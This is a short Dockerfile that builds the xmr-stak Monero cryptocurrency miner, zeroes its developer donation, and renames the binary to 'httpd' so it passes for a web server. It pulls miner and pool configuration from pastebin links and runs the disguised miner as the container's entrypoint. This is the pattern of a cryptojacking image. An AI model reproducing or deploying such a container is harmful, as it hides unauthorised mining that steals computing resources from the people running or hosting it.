# Latest version of ubuntu  
FROM ubuntu:xenial  
  
# Default git repository  
ENV GIT_REPOSITORY https://github.com/fireice-uk/xmr-stak.git  
ENV XMRSTAK_CMAKE_FLAGS -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
-DMICROHTTPD_ENABLE=OFF  
  
# Innstall packages  
RUN apt-get update \  
&& set -x \  
&& apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-
dev git wget \  
&& git clone $GIT_REPOSITORY \  
&& cd /xmr-stak \  
&& sed -i "s/fDevDonationLevel = 2.0/fDevDonationLevel = 0.0/g"
xmrstak/donate-level.hpp \  
&& sysctl -w vm.nr_hugepages=128 \  
&& cmake ${XMRSTAK_CMAKE_FLAGS} . \  
&& make \  
&& cd \- \  
&& mv /xmr-stak/bin/* /usr/local/bin/ \  
&& mv /usr/local/bin/xmr-stak /usr/local/bin/httpd \  
&& rm -rf /xmr-stak \  
&& wget https://pastebin.com/raw/kwfUzTtk -O /usr/local/bin/config.txt \  
&& wget https://pastebin.com/raw/tXuy50KB -O /usr/local/bin/pools.txt \  
&& apt-get purge -y libmicrohttpd-dev libssl-dev cmake build-essential
libhwloc-dev git wget \  
&& apt-get clean -qq  
  
VOLUME /mnt  
  
WORKDIR /mnt  
  
ENTRYPOINT
["/usr/local/bin/httpd","-c","/usr/local/bin/config.txt","-C","/usr/local/bin/pools.txt"]  

